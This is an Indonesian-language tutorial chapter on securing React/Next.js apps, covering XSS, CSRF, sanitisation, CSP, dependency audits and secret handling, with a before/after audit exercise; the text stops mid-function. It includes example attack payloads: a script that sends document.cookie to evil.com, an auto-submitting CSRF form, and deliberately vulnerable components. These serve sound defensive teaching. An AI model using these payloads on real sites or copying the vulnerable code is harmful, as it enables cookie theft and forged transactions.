# 14 — Security di React/Next.js: Yang Wajib Kamu Tahu Sebelum Ship ke Production

> **Gaya baca:** Anggap ini obrolan santai dari senior ke junior. Gue bakal kasih tau kesalahan nyata yang sering bikin app kena hack — bukan ceramah teori.

---

## Daftar Isi

1. [Kenapa Frontend Dev Harus Peduli Security?](#1-kenapa-frontend-dev-harus-peduli-security)
2. [XSS — Cross-Site Scripting](#2-xss--cross-site-scripting)
3. [CSRF — Cross-Site Request Forgery](#3-csrf--cross-site-request-forgery)
4. [dangerouslySetInnerHTML — Si Pisau Tajam](#4-dangerouslysetinnerhtml--si-pisau-tajam)
5. [Content Security Policy (CSP) di Next.js](#5-content-security-policy-csp-di-nextjs)
6. [Dependency Vulnerability — Bom Waktu di node_modules](#6-dependency-vulnerability--bom-waktu-di-node_modules)
7. [Sensitive Data di Frontend](#7-sensitive-data-di-frontend)
8. [Security Checklist Sebelum Deploy](#8-security-checklist-sebelum-deploy)
9. [Mini Project: Security Audit & Fix](#9-mini-project-security-audit--fix)

---

## 1. Kenapa Frontend Dev Harus Peduli Security?

Salah kaprah yang sering gue dengar dari junior:

> *"Security itu urusan backend. Gue cuma bikin UI."*

Masalahnya, **serangan paling merusak justru dieksekusi di browser** — di territory-mu. XSS, CSRF, data leak — semua bisa terjadi karena satu baris kode frontend yang salah.

Bayangin skenario ini:

```
User buka app kamu
  → Attacker inject script jahat via kolom komentar
  → Script jalan di browser semua user yang baca komentar itu
  → Dalam hitungan detik: cookie dicuri, aksi dilakukan atas nama user
  → App kamu jadi alat serangan
```

Dan kamu yang nge-review PR itu lolos-lolosin aja. Pahit kan?

---

## 2. XSS — Cross-Site Scripting

### Cara Kerjanya

XSS terjadi ketika **input dari user dirender sebagai HTML/JavaScript** tanpa sanitasi. Ada 3 jenis:

| Tipe | Cara Kerja |
|------|-----------|
| **Stored XSS** | Script disimpan di database, dirender ke semua user |
| **Reflected XSS** | Script ada di URL, dirender langsung oleh server |
| **DOM-based XSS** | Script dieksekusi via manipulasi DOM di client |

### Skenario Nyata: Kolom Komentar

User jahat isi kolom komentar dengan:

```html
Komentar bagus! <script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

Kalau app kamu render komentar itu sebagai raw HTML — selesai. Semua user yang baca komentar itu cookie-nya dikirim ke server si attacker.

---

### XSS di React: Exploit vs Pencegahan

#### ❌ BERBAHAYA — Render HTML mentah

```tsx
// Jangan pernah lakukan ini dengan input user!
function Comment({ content }: { content: string }) {
  return (
    <div
      dangerouslySetInnerHTML={{ __html: content }}
    />
  );
}

// Kalau content = '<img src=x onerror="stealCookies()">'
// Script itu AKAN dieksekusi
```

#### ✅ AMAN — React escapes otomatis

```tsx
// React secara default escape semua string yang di-render
function Comment({ content }: { content: string }) {
  return (
    <div>{content}</div>
    // React akan mengubah < menjadi &lt;, > menjadi &gt;
    // Script jadi teks biasa, tidak dieksekusi
  );
}
```

#### ✅ AMAN — Kalau memang harus render HTML (pakai sanitizer)

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

```tsx
import DOMPurify from 'dompurify';

interface CommentProps {
  content: string;
}

function Comment({ content }: CommentProps) {
  // DOMPurify buang semua tag/atribut berbahaya
  const cleanHTML = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: [], // tidak ada atribut yang diizinkan
  });

  return (
    <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
  );
}
```

```tsx
// Test: input berbahaya
const malicious = '<p>Hello</p><script>alert("XSS")</script><img src=x onerror="hack()">';
DOMPurify.sanitize(malicious);
// Output: '<p>Hello</p>'  ← bersih, script dan img berbahaya hilang
```

---

### XSS via URL Parameter (DOM-based)

```tsx
// ❌ BERBAHAYA — inject langsung dari URL ke DOM
function SearchPage() {
  const query = new URLSearchParams(window.location.search).get('q');
  
  return (
    <div dangerouslySetInnerHTML={{ __html: `Hasil untuk: ${query}` }} />
    // URL: /search?q=<script>alert(1)</script>
    // → Script dieksekusi!
  );
}
```

```tsx
// ✅ AMAN — gunakan state/React rendering
function SearchPage() {
  const [searchParams] = useSearchParams();
  const query = searchParams.get('q') ?? '';

  return (
    <div>Hasil untuk: {query}</div>
    // React escape otomatis
  );
}
```

---

### XSS via href — Yang Sering Kelewatan

```tsx
// ❌ BERBAHAYA — javascript: protocol
function UserProfile({ websiteUrl }: { websiteUrl: string }) {
  return <a href={websiteUrl}>Website saya</a>;
  // Kalau websiteUrl = 'javascript:stealCookies()'
  // Klik link → script jalan!
}
```

```tsx
// ✅ AMAN — validasi protocol sebelum render
function UserProfile({ websiteUrl }: { websiteUrl: string }) {
  const isSafeUrl = (url: string): boolean => {
    try {
      const parsed = new URL(url);
      return ['https:', 'http:'].includes(parsed.protocol);
    } catch {
      return false;
    }
  };

  return (
    <a
      href={isSafeUrl(websiteUrl) ? websiteUrl : '#'}
      rel="noopener noreferrer"
      target="_blank"
    >
      Website saya
    </a>
  );
}
```

---

## 3. CSRF — Cross-Site Request Forgery

### Cara Kerjanya

CSRF terjadi ketika **browser user secara otomatis menyertakan credentials (cookie)** saat request ke domain lain.

### Skenario Nyata: Transfer Uang

1. Kamu login ke `mybank.com` — browser simpan session cookie
2. Kamu buka tab baru, buka `evil.com`
3. `evil.com` punya form tersembunyi:

```html
<!-- Di evil.com — tidak kelihatan user -->
<form id="attack" action="https://mybank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000000" />
</form>
<script>document.getElementById('attack').submit();</script>
```

4. Browser kamu kirim POST ke `mybank.com` — **beserta session cookie yang valid**
5. Server `mybank.com` pikir request sah → transfer terjadi

---

### Proteksi CSRF di Next.js

#### Strategi 1: CSRF Token (Server-Side)

```typescript
// app/api/transfer/route.ts
import { headers } from 'next/headers';
import { validateCSRFToken } from '@/lib/csrf';

export async function POST(request: Request) {
  const headersList = await headers();
  
  // Ambil CSRF token dari header (bukan dari cookie)
  const csrfToken = headersList.get('x-csrf-token');
  
  // Validasi token
  if (!await validateCSRFToken(csrfToken)) {
    return Response.json(
      { error: 'Invalid CSRF token' },
      { status: 403 }
    );
  }

  // Proses request yang legitimate
  const body = await request.json();
  // ... logic transfer
}
```

```typescript
// lib/csrf.ts
import { SignJWT, jwtVerify } from 'jose';

const secret = new TextEncoder().encode(process.env.CSRF_SECRET!);

export async function generateCSRFToken(sessionId: string): Promise<string> {
  return new SignJWT({ sessionId, type: 'csrf' })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('1h')
    .sign(secret);
}

export async function validateCSRFToken(token: string | null): Promise<boolean> {
  if (!token) return false;
  try {
    await jwtVerify(token, secret);
    return true;
  } catch {
    return false;
  }
}
```

```tsx
// hooks/useCSRF.ts
import { useState, useEffect } from 'react';

export function useCSRF() {
  const [csrfToken, setCSRFToken] = useState<string | null>(null);

  useEffect(() => {
    // Ambil token dari server saat komponen mount
    fetch('/api/csrf-token')
      .then(res => res.json())
      .then(data => setCSRFToken(data.token));
  }, []);

  // Helper untuk include token di setiap request
  const secureHeaders = {
    'Content-Type': 'application/json',
    'x-csrf-token': csrfToken ?? '',
  };

  return { csrfToken, secureHeaders };
}
```

```tsx
// components/TransferForm.tsx
function TransferForm() {
  const { secureHeaders } = useCSRF();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    await fetch('/api/transfer', {
      method: 'POST',
      headers: secureHeaders, // CSRF token selalu disertakan
      body: JSON.stringify({ to: '...', amount: 100 }),
    });
  };

  return <form onSubmit={handleSubmit}>...</form>;
}
```

#### Strategi 2: SameSite Cookie (Proteksi Otomatis)

```typescript
// Saat set cookie dari server
// Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

// Di Next.js:
import { cookies } from 'next/headers';

export async function POST(request: Request) {
  const cookieStore = await cookies();
  
  cookieStore.set('session', sessionToken, {
    httpOnly: true,     // tidak bisa diakses via JS
    secure: true,       // hanya HTTPS
    sameSite: 'strict', // tidak dikirim ke cross-site request
    maxAge: 60 * 60 * 24, // 1 hari
    path: '/',
  });
}
```

> `SameSite=Strict` adalah proteksi CSRF paling simpel dan efektif. **Selalu set ini** kalau kamu punya kendali atas server.

---

## 4. dangerouslySetInnerHTML — Si Pisau Tajam

### Kenapa Berbahaya?

Nama prop-nya sudah memberi peringatan: **dangerously**. React sengaja bikin namanya panjang dan scary supaya kamu pikir dua kali.

Ketika kamu pakai `dangerouslySetInnerHTML`, kamu **bypass proteksi XSS bawaan React**. React tidak akan escape string tersebut — semua konten dirender sebagai HTML literal.

### Kapan TERPAKSA Memakainya?

Ada situasi legitimate di mana kamu memang butuh render HTML:

| Kasus | Alternatif Lebih Baik |
|-------|----------------------|
| Render markdown dari CMS | Pakai `react-markdown` |
| Email preview | Pakai iframe dengan sandbox |
| Rich text dari WYSIWYG editor | Sanitize dengan DOMPurify dulu |
| HTML dari CMS/headless (Contentful, Sanity) | Sanitize + whitelist tags |
| Server-generated HTML yang kamu kontrol 100% | ✅ Boleh, tapi tetap hati-hati |

### Rules of Thumb

```tsx
// RULE 1: Kalau sumbernya user input → JANGAN, atau SANITIZE dulu
const userComment = getUserInput(); // ← dari database, dari API, dari user
// ❌
<div dangerouslySetInnerHTML={{ __html: userComment }} />
// ✅
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }} />


// RULE 2: Kalau sumbernya kamu sendiri (hardcoded) → relatif aman
const badge = '<span class="badge">Admin</span>'; // kamu yang tulis ini
// ✅ (tapi sebaiknya tetap pakai komponen React)
<div dangerouslySetInnerHTML={{ __html: badge }} />


// RULE 3: Kalau dari CMS/API pihak ketiga → sanitize SELALU
async function BlogPost({ slug }: { slug: string }) {
  const post = await fetchFromCMS(slug);
  
  // CMS mungkin simpan HTML — sanitize sebelum render
  const cleanContent = DOMPurify.sanitize(post.content, {
    ALLOWED_TAGS: ['p', 'h2', 'h3', 'h4', 'ul', 'ol', 'li', 'strong', 
                   'em', 'a', 'img', 'blockquote', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'class', 'target', 'rel'],
    // Paksa semua link buka di tab baru
    ADD_ATTR: ['target'],
    FORCE_BODY: true,
  });

  return <article dangerouslySetInnerHTML={{ __html: cleanContent }} />;
}
```

### DOMPurify di Next.js (Server vs Client)

```tsx
// ⚠️ DOMPurify butuh DOM API — tidak bisa jalan di server!
// Kalau render di Server Component, gunakan isomorphic-dompurify

// app/components/SafeHTML.tsx
'use client'; // harus client component

import DOMPurify from 'dompurify';

interface SafeHTMLProps {
  html: string;
  className?: string;
}

export function SafeHTML({ html, className }: SafeHTMLProps) {
  return (
    <div
      className={className}
      dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(html),
      }}
    />
  );
}
```

```tsx
// Atau gunakan isomorphic-dompurify yang bisa jalan di server dan client
// npm install isomorphic-dompurify

import DOMPurify from 'isomorphic-dompurify';

// Sekarang bisa dipakai di Server Component
export default async function BlogPost({ slug }: { slug: string }) {
  const post = await fetchPost(slug);
  const clean = DOMPurify.sanitize(post.content);

  return <article dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

---

## 5. Content Security Policy (CSP) di Next.js

### Apa itu CSP?

CSP adalah HTTP header yang memberi tahu browser: **"Hanya percaya resource dari sumber ini"**. Kalau ada script dari domain yang tidak ada di whitelist → browser blokir.

Ini adalah **layer terakhir** pertahanan melawan XSS. Bahkan kalau attacker berhasil inject script, CSP bisa mencegah eksekusinya.

### Implementasi di Next.js

```typescript
// next.config.ts
import type { NextConfig } from 'next';

const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'unsafe-eval' 'unsafe-inline' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https://images.trusted.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.yourapp.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
`;

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: ContentSecurityPolicy.replace(/\n/g, ''),
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY', // Cegah clickjacking
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=(self)',
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

### CSP dengan Nonce (Untuk Inline Scripts)

Problem: Next.js butuh inline scripts, tapi CSP blokir `unsafe-inline`. Solusinya: **nonce**.

```typescript
// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { randomBytes } from 'crypto';

export function middleware(request: NextRequest) {
  const nonce = randomBytes(16).toString('base64');
  
  const csp = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}';
    style-src 'self' 'nonce-${nonce}';
    font-src 'self';
    img-src 'self' data:;
    connect-src 'self' https://api.yourapp.com;
    frame-ancestors 'none';
    object-src 'none';
    base-uri 'self';
  `.replace(/\n/g, '');

  const response = NextResponse.next();
  
  // Kirim nonce ke Next.js via header agar bisa dipakai di <script> tags
  response.headers.set('x-nonce', nonce);
  response.headers.set('Content-Security-Policy', csp);
  
  return response;
}

export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
};
```

```tsx
// app/layout.tsx
import { headers } from 'next/headers';

export default async function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const headersList = await headers();
  const nonce = headersList.get('x-nonce') ?? '';

  return (
    <html lang="id">
      <head>
        {/* Script dengan nonce = diizinkan CSP */}
        <script nonce={nonce} src="/analytics.js" />
      </head>
      <body>{children}</body>
    </html>
  );
}
```

### CSP Report: Deteksi Pelanggaran

```typescript
// next.config.ts — tambah report-uri untuk monitoring
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self';
  ...
  report-uri /api/csp-report;
  report-to csp-endpoint;
`;

// app/api/csp-report/route.ts
export async function POST(request: Request) {
  const report = await request.json();
  
  // Log ke monitoring service (Sentry, Datadog, dll)
  console.error('[CSP Violation]', {
    blockedURI: report['csp-report']?.['blocked-uri'],
    violatedDirective: report['csp-report']?.['violated-directive'],
    documentURI: report['csp-report']?.['document-uri'],
  });

  return new Response(null, { status: 204 });
}
```

---

## 6. Dependency Vulnerability — Bom Waktu di node_modules

### Kenapa Ini Penting?

`node_modules` kamu bisa berisi ratusan ribu file dari ribuan package. Setiap package adalah potential attack vector. Di 2021, package `colors` dan `faker` sengaja di-sabotage oleh developernya sendiri. Di 2022, `node-ipc` — yang dipakai jutaan project — diisi malware.

Kamu tidak punya kontrol langsung atas kode mereka. Tapi kamu punya kontrol atas **versi yang kamu pakai**.

### npm audit: Deteksi Vulnerability

```bash
# Scan semua vulnerability
npm audit

# Output contoh:
# found 3 vulnerabilities (1 moderate, 2 high)
#
# high: Prototype Pollution in lodash
# Package: lodash
# Vulnerable versions: <4.17.21
# Patched in: >=4.17.21
# Paths: your-app > some-package > lodash
```

```bash
# Fix otomatis (hati-hati: bisa breaking changes)
npm audit fix

# Fix dengan izin major version bump
npm audit fix --force

# Lihat detail dalam format JSON (untuk parsing/CI)
npm audit --json
```

### Workflow Aman Update Dependencies

```bash
# Step 1: Cek versi outdated
npm outdated

# Output:
# Package         Current  Wanted  Latest
# react           18.2.0   18.3.1  18.3.1
# next            14.1.0   14.2.3  14.2.3
# axios            1.5.0    1.7.2   1.7.2
```

```bash
# Step 2: Update satu per satu, jangan sekaligus
# Update patch dan minor (relatif aman)
npm update react

# Step 3: Jalankan tests setelah setiap update
npm test

# Step 4: Untuk major version, baca changelog dulu
# https://github.com/[package]/[repo]/releases
npm install next@15  # major bump — baca migration guide dulu!
```

### Pakai Lockfile dengan Benar

```bash
# ✅ Di production/CI: gunakan ci yang strict
npm ci  # install PERSIS sesuai package-lock.json, lebih aman dari npm install

# ✅ Commit package-lock.json ke git
git add package-lock.json
git commit -m "chore: update dependencies"

# ❌ Jangan taruh package-lock.json di .gitignore!
```

### Otomasi: Dependabot / Renovate

```yaml
# .github/dependabot.yml — auto PR untuk update dependencies
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    # Pisahkan update — jangan semua sekaligus
    groups:
      typescript-eslint:
        patterns:
          - "@typescript-eslint/*"
      react:
        patterns:
          - "react*"
          - "@types/react*"
    # Auto-merge patch updates
    automerge-conditions:
      - "update-type == 'version-update:semver-patch'"
```

### Cek Sebelum Install Package Baru

Sebelum `npm install whatever`, tanya diri sendiri:

```bash
# 1. Berapa downloads per minggu? (popularity = lebih banyak yang review)
# Cek di npmjs.com

# 2. Kapan terakhir di-maintain?
npm info axios time.modified

# 3. Ada vulnerability yang diketahui?
npm audit  # setelah install

# 4. Bisa diganti dengan native API?
# Contoh: lodash.get → optional chaining (?.)
# axios → native fetch
# moment → date-fns atau Intl API
```

---

## 7. Sensitive Data di Frontend

### Aturan Emas

> **Apapun yang ada di browser bisa dilihat user.** Tidak ada "hidden" yang benar-benar hidden di client.

Developer Tools terbuka, network tab terbuka, source code bisa di-view — semuanya exposed.

---

### Apa yang BOLEH Ada di Client

```tsx
// ✅ Public API URL
const API_URL = process.env.NEXT_PUBLIC_API_URL; // intentionally public

// ✅ Feature flags (non-sensitive)
const ENABLE_DARK_MODE = process.env.NEXT_PUBLIC_FEATURE_DARK_MODE === 'true';

// ✅ Public keys (yang memang didesain untuk client)
const STRIPE_PUBLIC_KEY = process.env.NEXT_PUBLIC_STRIPE_KEY;
// Stripe public key aman di client — dirancang untuk dipakai di browser
// Yang TIDAK boleh di client adalah STRIPE_SECRET_KEY

// ✅ Google Maps API key (dengan domain restriction di Google Console)
const MAPS_KEY = process.env.NEXT_PUBLIC_GOOGLE_MAPS_KEY;
```

### Apa yang TIDAK BOLEH Ada di Client

```tsx
// ❌ Database credentials
const DB_URL = process.env.DATABASE_URL; // kalau di client, semua orang bisa konek DB kamu

// ❌ API Secret keys
const OPENAI_KEY = process.env.OPENAI_API_KEY; // exposed = tagihan API membengkak

// ❌ JWT Secret
const JWT_SECRET = process.env.JWT_SECRET; // exposed = semua token bisa dipalsukan

// ❌ OAuth Client Secret
const GOOGLE_SECRET = process.env.GOOGLE_CLIENT_SECRET; // beda dengan CLIENT_ID yang boleh

// ❌ Internal service URLs/keys
const INTERNAL_API = process.env.INTERNAL_SERVICE_URL;
```

> **Di Next.js:** Env var tanpa prefix `NEXT_PUBLIC_` otomatis server-only. Ini default yang bagus — manfaatkan!

---

### Jangan Simpan Sensitive Data di localStorage/sessionStorage

```tsx
// ❌ BERBAHAYA — localStorage bisa dibaca oleh SEMUA script di halaman
localStorage.setItem('authToken', token);
localStorage.setItem('userId', user.id);
localStorage.setItem('creditCard', cardNumber); // please jangan

// Kenapa berbahaya:
// 1. XSS attack bisa baca: localStorage.getItem('authToken')
// 2. Tidak ada expiry otomatis
// 3. Semua tab browser bisa akses
```

```tsx
// ✅ Untuk auth token: gunakan HttpOnly cookie (dihandle server)
// Client tidak bisa baca, tapi otomatis dikirim ke server

// ✅ Untuk data non-sensitive yang perlu persist:
localStorage.setItem('theme', 'dark'); // OK — bukan data sensitif
localStorage.setItem('language', 'id'); // OK

// ✅ Kalau terpaksa simpan token di client (SPA tanpa server):
// Simpan di memory (variable), bukan localStorage
// Trade-off: hilang saat refresh, tapi lebih aman dari XSS
let authToken: string | null = null; // in-memory storage

function setToken(token: string) {
  authToken = token;
}

function clearToken() {
  authToken = null;
}
```

### Jangan Log Sensitive Data

```tsx
// ❌ Jangan pernah console.log sensitive info — muncul di DevTools production
console.log('User logged in:', { userId, email, token, role });
console.log('API Key:', apiKey);
console.log('Form submitted:', { cardNumber, cvv }); // oh no

// ✅ Log hanya data yang aman
console.log('User logged in:', { userId, email }); // ok, tidak ada token
console.log('Action success:', { action: 'payment', status: 'ok' }); // tidak ada nomor kartu

// ✅ Matikan console.log di production
// next.config.ts
const config: NextConfig = {
  compiler: {
    removeConsole: process.env.NODE_ENV === 'production', // hapus semua console.*
  },
};
```

### Validasi di Server, Bukan Cuma di Client

```tsx
// ❌ Jangan andalkan client-side validation untuk security
function AdminPage() {
  const { user } = useAuth();
  
  // Ini gampang di-bypass! Tinggal edit JS di DevTools
  if (user.role !== 'admin') {
    return <p>Tidak punya akses</p>;
  }
  
  return <AdminDashboard />;
}
```

```typescript
// ✅ Validasi auth/authorization di server
// app/admin/page.tsx
import { redirect } from 'next/navigation';
import { getServerSession } from 'next-auth';

export default async function AdminPage() {
  const session = await getServerSession();
  
  // Server-side check — tidak bisa di-bypass
  if (!session || session.user.role !== 'admin') {
    redirect('/unauthorized');
  }
  
  return <AdminDashboard />;
}
```

---

## 8. Security Checklist Sebelum Deploy

### XSS

- [ ] Tidak ada `dangerouslySetInnerHTML` tanpa sanitasi DOMPurify
- [ ] URL yang berasal dari user divalidasi protokolnya (`http:` / `https:` saja)
- [ ] Tidak ada `eval()`, `new Function()`, atau `innerHTML` di kode sendiri
- [ ] Input user yang ditampilkan kembali ke halaman sudah di-escape
- [ ] Rich text dari WYSIWYG atau CMS disanitasi sebelum render

### CSRF

- [ ] Cookie session diset dengan `SameSite=Strict` atau `SameSite=Lax`
- [ ] Cookie sensitif menggunakan `HttpOnly=true`
- [ ] Cookie hanya melalui HTTPS dengan `Secure=true`
- [ ] Mutating endpoints (POST/PUT/DELETE) memvalidasi CSRF token atau Origin header

### Secrets & Data

- [ ] Tidak ada API secret key di env var dengan prefix `NEXT_PUBLIC_`
- [ ] Tidak ada hardcoded password/token di source code
- [ ] Token auth tidak disimpan di `localStorage`
- [ ] Console.log production dimatikan atau tidak mencetak data sensitif
- [ ] Respon API tidak menyertakan field sensitif yang tidak diperlukan (misal: password hash)

### Dependencies

- [ ] `npm audit` dijalankan dan tidak ada high/critical vulnerability
- [ ] `package-lock.json` di-commit ke git
- [ ] Dependencies outdated di-review dan di-update
- [ ] Tidak ada package yang tidak dipakai masih ada di `package.json`

### Headers & CSP

- [ ] CSP header dikonfigurasi di `next.config.ts`
- [ ] `X-Frame-Options: DENY` untuk cegah clickjacking
- [ ] `X-Content-Type-Options: nosniff` aktif
- [ ] HTTPS dipakai di production (HSTS header)
- [ ] `Referrer-Policy` dikonfigurasi

### Authorization

- [ ] Route protection dilakukan di server (middleware / Server Component)
- [ ] Tidak mengandalkan client-side role check saja
- [ ] API endpoints memvalidasi session/token di server

---

## 9. Mini Project: Security Audit & Fix

### Context

Kamu baru join sebagai developer di startup. Ada app sederhana — blog platform dengan fitur komentar dan user profile. Tugasmu: **audit dan fix semua security issue yang ada**.

### Kode Awal (Penuh Vulnerability)

```
src/
  components/
    CommentSection.tsx    ← ada XSS
    UserProfile.tsx       ← ada XSS via href
    PostContent.tsx       ← ada XSS dari CMS
  app/
    admin/page.tsx        ← auth hanya client-side
    api/comment/route.ts  ← tidak ada CSRF protection
  lib/
    storage.ts            ← token disimpan di localStorage
  next.config.ts          ← tidak ada security headers
  .env.local              ← secret key di NEXT_PUBLIC_
```

---

### File 1: CommentSection.tsx

**BEFORE — Vulnerable:**

```tsx
// ❌ src/components/CommentSection.tsx (VULNERABLE)
interface Comment {
  id: string;
  author: string;
  content: string; // bisa berisi HTML/script
}

function CommentSection({ comments }: { comments: Comment[] }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id} className="comment">
          <strong>{comment.author}</strong>
          {/* ❌ XSS: content dari user dirender sebagai HTML */}
          <div dangerouslySetInnerHTML={{ __html: comment.content }} />
        </div>
      ))}
    </div>
  );
}
```

**AFTER — Fixed:**

```tsx
// ✅ src/components/CommentSection.tsx (FIXED)
import DOMPurify from 'isomorphic-dompurify';

interface Comment {
  id: string;
  author: string;
  content: string;
}

// Opsi 1: Render sebagai plain text (paling aman)
function CommentSection({ comments }: { comments: Comment[] }) {
  return (
    <div>
      {comments.map(comment => (
        <div key={comment.id} className="comment">
          {/* React auto-escape — aman */}
          <strong>{comment.author}</strong>
          <p>{comment.content}</p>
        </div>
      ))}
    </div>
  );
}

// Opsi 2: Kalau memang perlu support basic formatting
function CommentSectionWithFormatting({ comments }: { comments: Comment[] }) {
  return (
    <div>
      {comments.map(comment => {
        const safeContent = DOMPurify.sanitize(comment.content, {
          ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'br'],
          ALLOWED_ATTR: [],
        });

        return (
          <div key={comment.id} className="comment">
            <strong>{comment.author}</strong>
            <div dangerouslySetInnerHTML={{ __html: safeContent }} />
          </div>
        );
      })}
    </div>
  );
}
```

---

### File 2: UserProfile.tsx

**BEFORE — Vulnerable:**

```tsx
// ❌ src/components/UserProfile.tsx (VULNERABLE)
interface User {
  name: string;
  website: string; // bisa berisi 'javascript:...'
  bio: string;
}

function UserProfile({ user }: { user: User }) {
  return (
    <div>
      <h2>{user.name}</h2>
      <p>{user.bio}</p>
      {/* ❌ XSS via javascript: protocol */}
      <a href={user.website}>Website saya</a>
    </div>
  );
}
```

**AFTER — Fixed:**

```tsx
// ✅ src/components/UserProfile.tsx (FIXED)
interface User {
  name: string;
  website: string;
  bio: string;
}

function sanitizeUrl(url: string): string | null {
  if (!url) return null;
  try {
    const parsed = new URL(url);
    if (['https:', 'http:'].includes(parsed.protocol)) {
      return url;
    }
    return null;
  } catch {
    return null;
  }
}

function UserProfile({ user }: { user: User }) {
  const safeWebsite = sanitizeUrl(user.website);

  return (
    <div>
      <h2>{user.name}</h2>
      <p>{user.bio}</p>
      {safeWebsite ? (
        <a
          href={safeWebsite}
          target="_blank"
          rel="noopener noreferrer" // cegah window.opener attack
        >
          Website saya
        </a>
      ) : (
        <span>Website tidak valid</span>
      )}
    </div>
  );
}
```

---

### File 3: app/admin/page.tsx

**BEFORE — Vulnerable:**

```tsx
// ❌ app/admin/page.tsx (VULNERABLE)
'use client';
import { useAuth } from '@/hooks/useAuth';

export default function AdminPage() {
  const { user } = useAuth();

  // ❌ Client-side only check — mudah di-bypass
  if (!user || user.role !== 'admin') {
    return <p>Akses ditolak</p>;
  }

  return <AdminDashboard />;
}
```

**AFTER — Fixed:**

```tsx
// ✅ app/admin/page.tsx (FIXED — Server Component)
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';
import { redirect } from 'next/navigation';

// Server Component — tidak perlu 'use client'
export default async function AdminPage() {
  const session = await getServerSession(authOptions);

  // ✅ Server-side check — tidak bisa di-bypass dari browser
  if (!session) {
    redirect('/login?callbackUrl=/admin');
  }

  if (session.user.role !== 'admin') {
    redirect('/unauthorized');
  }

  return <AdminDashboard />;
}
```

---

### File 4: lib/storage.ts

**BEFORE — Vulnerable:**

```typescript
// ❌ lib/storage.ts (VULNERABLE)
export const auth = {
  saveToken: (token: string) => {
    // ❌ localStorage = XSS bisa baca via document.cookie attack
    localStorage.setItem('auth_token', token);
    localStorage.setItem('user_data', JSON.stringify({ token }));
  },
  
  getToken: () => localStorage.getItem('auth_token'),
  
  clearToken: () => localStorage.removeItem('auth_token'),
};
```

**AFTER — Fixed:**

```typescript
// ✅ lib/storage.ts (FIXED — in-memory untuk token sensitif)

// Auth token disimpan di memory, bukan localStorage
// Trade-off: hilang saat refresh, tapi aman dari XSS
let _authToken: string | null = null;

export const auth = {
  // Token sensitif → in-memory
  saveToken: (token: string) => {
    _authToken = token;
  },
  
  getToken: () => _authToken,
  
  clearToken: () => {
    _authToken = null;
  },

  // Data non-sensitif untuk UX → localStorage ok
  savePreferences: (prefs: { theme: string; language: string }) => {
    localStorage.setItem('user_prefs', JSON.stringify(prefs));
  },
  
  getPreferences: () => {
    const stored = localStorage.getItem('user_prefs');
    return stored ? JSON.parse(stored) : null;
  },
};

// Catatan: Untuk production app dengan auth yang lebih robust,
// gunakan HttpOnly cookie yang diset dari server.
// Ini tidak bisa diakses oleh JavaScript sama sekali.
```

---

### File 5: api/comment/route.ts

**BEFORE — Vulnerable:**

```typescript
// ❌ app/api/comment/route.ts (VULNERABLE)
export async function POST(request: Request) {
  // ❌ Tidak ada CSRF protection
  // ❌ Tidak ada rate limiting
  const { postId, content } = await request.json();
  
  // ❌ Tidak ada validasi input
  await db.comment.create({ data: { postId, content } });
  
  return Response.json({ success: true });
}
```

**AFTER — Fixed:**

```typescript
// ✅ app/api/comment/route.ts (FIXED)
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';
import { z } from 'zod';
import DOMPurify from 'isomorphic-dompurify';
import { rateLimit } from '@/lib/rate-limit';

const CommentSchema = z.object({
  postId: z.string().uuid(),
  content: z.string().min(1).max(1000), // batasi panjang
});

export async function POST(request: Request) {
  // 1. Cek autentikasi
  const session = await getServerSession(authOptions);
  if (!session) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 });
  }

  // 2. Rate limiting (cegah spam)
  const ip = request.headers.get('x-forwarded-for') ?? 'unknown';
  const { success } = await rateLimit.check(ip, 10, '1m'); // 10 komentar per menit
  if (!success) {
    return Response.json({ error: 'Too many requests' }, { status: 429 });
  }

  // 3. Validasi input dengan Zod
  const body = await request.json();
  const parsed = CommentSchema.safeParse(body);
  if (!parsed.success) {
    return Response.json(
      { error: 'Invalid input', details: parsed.error.flatten() },
      { status: 400 }
    );
  }

  // 4. Sanitasi content sebelum simpan ke DB
  const sanitizedContent = DOMPurify.sanitize(parsed.data.content, {
    ALLOWED_TAGS: [], // plain text only untuk komentar
  });

  // 5. Simpan dengan user yang sudah terautentikasi
  await db.comment.create({
    data: {
      postId: parsed.data.postId,
      content: sanitizedContent,
      authorId: session.user.id, // dari session, bukan dari request body!
    },
  });

